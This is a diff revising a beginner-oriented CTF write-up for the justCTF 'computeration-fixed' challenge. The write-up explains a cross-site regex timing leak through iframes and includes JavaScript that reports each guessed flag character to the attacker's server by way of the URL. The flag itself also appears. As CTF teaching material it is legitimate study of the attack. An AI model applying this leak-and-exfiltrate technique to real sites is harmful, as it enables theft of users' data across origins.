@@ -6,12 +6,12 @@ If you find anything interesting give me call here: https://computeration-fixed.
 
 >The flag is in the format: justCTF{[a-z_]+}.
 
-**note**: I didn't solve this challenge during the CTF, but as a web-noob I wanted to create a writeup that was as bit more noob-friendly for my fellow web-noobs.
+**note**: I didn't solve this challenge during the CTF, but as a web-noob, I wanted to create a writeup that was as bit more beginner friendly for my fellow web-noobs.
 
 ## Recon: The Webapp
 Let's start by taking a look at the source of the webapp. There are a couple things to note right out of the gate:  
-1. The `x-frame-options` is not set, so we can `iframe` the webapp to our hearts content _(foreshadowing?)_
-2. Notes are indeed client-side, and reside in the sessions localStorage:
+1. The `x-frame-options` header is not set, so we can `iframe` the webapp to our hearts content. _(foreshadowing?)_
+2. Notes are indeed client-side, and reside in the session's localStorage:
 
 ```js
 let notes = JSON.parse(localStorage.getItem('notes')) || [];
@@ -19,7 +19,7 @@ let notes = JSON.parse(localStorage.getItem('notes')) || [];
 
 3. Neither note creation, nor rendering is properly sanitized, however this is not useful as there is no way to turn this into anything other than a self-XSS.
 
-4. Searching for notes uses the "hash" part of the current url and may contain regexes.
+4. Searches are based on the current URL, and use regex under the hood.
 ```js
 function searchNote(){
     location.hash = searchNoteInp.value;
@@ -74,11 +74,11 @@ The final secret-sauce is the last part of the regex. Without it, the engine can
 1. Load an `iframe` that contains the webapp.
 1. Perform a regex search in the `iframe` to guess the next character of the flag.
 1. Queue another task and measure how long it takes to complete.
-1. Use the measurement to estimate how long the regex search took to complete, which confirms or rejects your guess.
+1. If the task takes longer than expected, the regex engine must have slowed down our thread. This means our guess was correct.
 
 Initially, I used an `async` function with a timeout to perform measurements. However, this approach only works in the challenge server is single threaded. Otherwise the measurement will simply be performed on another thread due to "Site Isolation" (see [xsleaks](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/)).  
   
-In a nutshell, Chrome isolates javascript processes by their respective domains, so we need a way to create a task under the challenge servers domain. To do this, we will just load a new `iframe` with `src=https://computeration-fixed.web.jctf.pro/#` for each guess.
+In a nutshell, **Chrome isolates javascript processes by their respective domains**, so we need a way to create a task under the challenge servers domain. To do this, we will just load a new `iframe` with `src=https://computeration-fixed.web.jctf.pro/#` for each guess.
 
 ### Guessing The Next Character
 
@@ -113,10 +113,10 @@ async function measure(start, c) {
 
   // This took longer than usual, indicating regex-bullshittery
   if (time > threshold) {
-    // Add the current flag to the url so we can see it in our server logs
-    window.location = window.location.origin + window.location.pathname + "?" + known + c;
     // Update the "known" variable with the new character
     known = known + c;
+    // Add the current flag to the url so we can see it in our server logs
+    window.location = window.location.origin + window.location.pathname + "?" + known;
   }
 }
 
@@ -150,6 +150,11 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 ```
 flag: justCTF{no_referer_typo_ehhhhhh}
 ```
+
+## Demo
+The victims chrome session can be seen in the top half of the screen. The bottom half of the screen shows the requests received by our PHP server. The flag is slowly extracted over the course of a few minutes.
+
+![](res/demo.gif)
 
 
 ## Acknowledgement and Links
